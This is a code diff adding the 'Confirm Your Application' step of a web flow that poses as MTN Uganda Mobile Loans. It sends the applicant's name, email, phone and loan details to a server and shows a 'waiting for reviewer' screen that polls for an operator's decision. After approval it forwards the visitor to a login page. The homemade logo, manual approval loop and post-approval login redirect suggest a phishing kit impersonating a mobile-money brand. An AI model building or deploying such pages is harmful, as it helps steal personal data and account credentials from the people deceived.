@@ -1,0 +1,375 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Confirm - MTN Uganda Loans</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
+
+        body { background: #f4f4f4; min-height: 100vh; display: flex; flex-direction: column; }
+
+        .header {
+            background: #fff; padding: 14px 20px;
+            display: flex; align-items: center; gap: 14px;
+            border-bottom: 3px solid #ffcc00;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.04);
+        }
+        .back-arrow { font-size: 22px; color: #333; text-decoration: none; cursor: pointer; }
+        .logo-box { display: flex; align-items: center; gap: 10px; }
+        .logo-icon {
+            width: 40px; height: 40px; background: #ffcc00;
+            border-radius: 8px; display: flex; align-items: center; justify-content: center;
+            font-weight: 800; font-size: 10px; color: #004f9f;
+            line-height: 1; text-align: center; border: 2px solid #004f9f;
+        }
+        .logo-text { font-weight: 800; font-size: 20px; color: #004f9f; letter-spacing: -0.5px; }
+        .header-title { font-size: 14px; font-weight: 700; color: #444; margin-left: auto; }
+
+        .main { flex: 1; display: flex; justify-content: center; padding: 30px 16px 60px; }
+        .card {
+            background: #fff; width: 100%; max-width: 520px;
+            border-radius: 16px; padding: 36px 30px 32px;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.08);
+            height: fit-content;
+        }
+        .card h1 {
+            font-size: 24px; font-weight: 800; color: #111;
+            text-align: center; margin-bottom: 6px;
+        }
+        .step-text { text-align: center; color: #888; font-size: 13px; margin-bottom: 16px; }
+
+        .progress { display: flex; gap: 8px; justify-content: center; margin-bottom: 30px; }
+        .progress .bar { height: 5px; width: 70px; border-radius: 3px; background: #e0e0e0; }
+        .progress .bar.active { background: #ffcc00; }
+
+        .summary { margin-bottom: 26px; }
+        .summary-row {
+            display: flex; justify-content: space-between; align-items: baseline;
+            padding: 12px 0; border-bottom: 1px dashed #eee;
+            font-size: 14px;
+        }
+        .summary-row:last-child { border-bottom: none; }
+        .summary-label { color: #666; font-weight: 600; }
+        .summary-value { color: #111; font-weight: 800; text-align: right; max-width: 60%; }
+
+        .summary-row.total {
+            border-top: 2px solid #ffcc00; border-bottom: none;
+            margin-top: 8px; padding-top: 16px;
+        }
+        .summary-row.total .summary-label { color: #d4a000; font-weight: 800; font-size: 15px; }
+        .summary-row.total .summary-value { color: #d4a000; font-weight: 900; font-size: 18px; }
+
+        .agree-box {
+            display: flex; align-items: flex-start; gap: 10px;
+            padding: 14px; background: #fffef8;
+            border: 1px solid #ffeeb0; border-radius: 10px;
+            margin-bottom: 22px; font-size: 13px; color: #333; line-height: 1.5;
+        }
+        .agree-box input[type=checkbox] {
+            margin-top: 2px; width: 18px; height: 18px;
+            accent-color: #ffcc00; flex-shrink: 0; cursor: pointer;
+        }
+        .agree-box label { cursor: pointer; }
+
+        .btn-group { display: flex; gap: 12px; margin-top: 6px; }
+        .prev-btn, .submit-btn {
+            flex: 1; padding: 16px; font-size: 15px; font-weight: 800;
+            letter-spacing: 1px; border-radius: 12px; cursor: pointer;
+            text-transform: uppercase; text-align: center;
+            text-decoration: none; display: inline-block;
+            transition: background 0.2s, transform 0.1s;
+            border: none;
+        }
+        .prev-btn { background: #f0f0f0; color: #333; }
+        .prev-btn:hover { background: #e0e0e0; }
+        .submit-btn { background: #ffcc00; color: #111; }
+        .submit-btn:hover:not(:disabled) { background: #e6b800; }
+        .submit-btn:disabled { opacity: 0.5; cursor: not-allowed; }
+
+        .error-msg {
+            display: none; text-align: center; color: #dc2626;
+            font-size: 13px; font-weight: 700; margin-top: 14px;
+        }
+        .error-msg.show { display: block; }
+
+        /* Overlays */
+        .overlay {
+            position: fixed; inset: 0;
+            background: rgba(255,255,255,0.98);
+            display: none; flex-direction: column;
+            align-items: center; justify-content: center;
+            z-index: 999; padding: 24px; text-align: center;
+        }
+        .overlay.show { display: flex; }
+
+        .spinner {
+            width: 70px; height: 70px;
+            border: 6px solid #ffeeb0;
+            border-top: 6px solid #ffcc00;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 24px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .overlay-title {
+            font-size: 20px; font-weight: 800; color: #111;
+            margin-bottom: 8px;
+        }
+        .overlay-sub {
+            font-size: 14px; color: #666; margin-bottom: 24px;
+            line-height: 1.6;
+        }
+
+        .countdown {
+            width: 70px; height: 70px;
+            background: #ffcc00; color: #111;
+            border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 30px; font-weight: 900;
+            box-shadow: 0 8px 20px rgba(255,204,0,0.4);
+        }
+
+        .x-circle {
+            width: 80px; height: 80px;
+            border-radius: 50%;
+            background: #dc2626; color: #fff;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 42px; font-weight: 900;
+            margin-bottom: 20px;
+        }
+
+        .retry-btn {
+            background: #111; color: #ffcc00;
+            border: none; padding: 14px 28px;
+            font-size: 14px; font-weight: 800;
+            border-radius: 10px; cursor: pointer;
+            text-transform: uppercase; letter-spacing: 1px;
+            margin-top: 16px;
+        }
+
+        .footer {
+            background: #111; color: #ffcc00; text-align: center;
+            padding: 18px; font-size: 13px; font-weight: 600;
+        }
+
+        @media (max-width: 480px) {
+            .card { padding: 28px 20px; }
+            .card h1 { font-size: 21px; }
+            .progress .bar { width: 55px; }
+            .btn-group { flex-direction: column; }
+        }
+    </style>
+</head>
+<body>
+
+    <header class="header">
+        <a href="details.html" class="back-arrow">←</a>
+        <div class="logo-box">
+            <div class="logo-icon">MTN<br>UG</div>
+            <div class="logo-text">MTN Uganda</div>
+        </div>
+        <span class="header-title">Mobile Loans</span>
+    </header>
+
+    <main class="main">
+        <div class="card">
+            <h1>Confirm Your Application</h1>
+            <p class="step-text">Step 3 of 3</p>
+
+            <div class="progress">
+                <div class="bar active"></div>
+                <div class="bar active"></div>
+                <div class="bar active"></div>
+            </div>
+
+            <div class="summary">
+                <div class="summary-row">
+                    <span class="summary-label">Applicant</span>
+                    <span class="summary-value" id="sumApplicant">—</span>
+                </div>
+                <div class="summary-row">
+                    <span class="summary-label">Email</span>
+                    <span class="summary-value" id="sumEmail">—</span>
+                </div>
+                <div class="summary-row">
+                    <span class="summary-label">Phone</span>
+                    <span class="summary-value" id="sumPhone">—</span>
+                </div>
+                <div class="summary-row">
+                    <span class="summary-label">Loan Amount</span>
+                    <span class="summary-value" id="sumAmount">—</span>
+                </div>
+                <div class="summary-row">
+                    <span class="summary-label">Term</span>
+                    <span class="summary-value" id="sumTerm">—</span>
+                </div>
+                <div class="summary-row total">
+                    <span class="summary-label">Total to Repay</span>
+                    <span class="summary-value" id="sumTotal">—</span>
+                </div>
+            </div>
+
+            <div class="agree-box">
+                <input type="checkbox" id="agree">
+                <label for="agree">I confirm the information above is correct and I agree to the terms.</label>
+            </div>
+
+            <div class="btn-group">
+                <a href="#" class="prev-btn" id="prevBtn">Previous</a>
+                <button class="submit-btn" id="submitBtn" disabled>Submit Application</button>
+            </div>
+
+            <p class="error-msg" id="errorMsg"></p>
+        </div>
+    </main>
+
+    <!-- WAITING OVERLAY -->
+    <div class="overlay" id="waiting">
+        <div class="spinner"></div>
+        <div class="overlay-title">Waiting for Approval</div>
+        <div class="overlay-sub">Your application was sent to our reviewer.<br>Please wait…</div>
+    </div>
+
+    <!-- REJECTED OVERLAY -->
+    <div class="overlay" id="rejected">
+        <div class="x-circle">✕</div>
+        <div class="overlay-title" style="color:#dc2626">Invalid Application</div>
+        <div class="overlay-sub" id="rejectMsg"></div>
+        <button class="retry-btn" onclick="location.reload()">Try Again</button>
+    </div>
+
+    <!-- APPROVED COUNTDOWN OVERLAY -->
+    <div class="overlay" id="loading">
+        <div class="spinner"></div>
+        <div class="overlay-title">Approved!</div>
+        <div class="overlay-sub">Connecting to MTN Uganda…</div>
+        <div class="countdown" id="countdown">5</div>
+    </div>
+
+    <footer class="footer">© 2026 MTN Uganda Loans</footer>
+
+    <script>
+        // ─── Read URL params ───
+        const params = new URLSearchParams(window.location.search);
+
+        const amount    = Number(params.get('amount') || 0);
+        const term      = Number(params.get('term')   || 12);
+        const firstName = params.get('firstName') || '';
+        const lastName  = params.get('lastName')  || '';
+        const email     = params.get('email')     || '';
+        const phone     = params.get('phone')     || '';
+
+        const interest = Math.round(amount * 0.08);
+        const total    = amount + interest;
+
+        function fmt(n) { return 'UGX ' + Number(n).toLocaleString(); }
+
+        // ─── Populate summary ───
+        document.getElementById('sumApplicant').textContent = (firstName + ' ' + lastName).trim() || '—';
+        document.getElementById('sumEmail').textContent     = email || '—';
+        document.getElementById('sumPhone').textContent     = phone ? '+256 ' + phone : '—';
+        document.getElementById('sumAmount').textContent    = amount ? fmt(amount) : '—';
+        document.getElementById('sumTerm').textContent      = term + ' months';
+        document.getElementById('sumTotal').textContent     = amount ? fmt(total) : '—';
+
+        // ─── Previous button ───
+        document.getElementById('prevBtn').addEventListener('click', function () {
+            this.href = 'details.html?' + params.toString();
+        });
+
+        // ─── Elements ───
+        const agree      = document.getElementById('agree');
+        const submitBtn  = document.getElementById('submitBtn');
+        const errorMsg   = document.getElementById('errorMsg');
+        const waitingEl  = document.getElementById('waiting');
+        const rejectedEl = document.getElementById('rejected');
+        const loadingEl  = document.getElementById('loading');
+        const countdownEl = document.getElementById('countdown');
+
+        // ─── Checkbox enables submit ───
+        agree.addEventListener('change', function () {
+            submitBtn.disabled = !this.checked;
+        });
+
+        // ─── Polling ───
+        let referenceId = null;
+        let pollTimer = null;
+
+        function startPolling() {
+            pollTimer = setInterval(async () => {
+                try {
+                    const res  = await fetch('/api/status?ref=' + encodeURIComponent(referenceId));
+                    const data = await res.json();
+
+                    if (data.status === 'confirmed') {
+                        clearInterval(pollTimer);
+                        waitingEl.classList.remove('show');
+                        loadingEl.classList.add('show');
+                        let n = 5;
+                        countdownEl.textContent = n;
+                        const iv = setInterval(() => {
+                            n--;
+                            countdownEl.textContent = n;
+                            if (n <= 0) {
+                                clearInterval(iv);
+                                window.location.href = 'login.html?' + params.toString();
+                            }
+                        }, 1000);
+                    } else if (data.status === 'rejected') {
+                        clearInterval(pollTimer);
+                        waitingEl.classList.remove('show');
+                        rejectedEl.classList.add('show');
+                        document.getElementById('rejectMsg').innerHTML =
+                            'Please use a valid registered MTN line<br>' +
+                            'by dialing <b>*115#</b> to verify your number.';
+                    }
+                } catch (err) {
+                    console.error('Poll failed:', err);
+                }
+            }, 3000);
+        }
+
+        // ─── Submit ───
+        submitBtn.addEventListener('click', async function () {
+            if (submitBtn.disabled) return;
+
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'SUBMITTING…';
+            errorMsg.classList.remove('show');
+
+            const payload = {
+                firstName, lastName, email, phone,
+                amount, term,
+                loanType: params.get('loanType') || 'personal',
+                purpose:  params.get('purpose')  || 'fee'
+            };
+
+            try {
+                const res = await fetch('/api/submit-application', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                const data = await res.json();
+
+                if (data.ok) {
+                    referenceId = data.referenceId;
+                    waitingEl.classList.add('show');
+                    startPolling();
+                } else {
+                    throw new Error('Server said not ok');
+                }
+            } catch (err) {
+                console.error(err);
+                errorMsg.textContent = 'Something went wrong. Please try again.';
+                errorMsg.classList.add('show');
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'Submit Application';
+            }
+        });
+    </script>
+</body>
+</html>
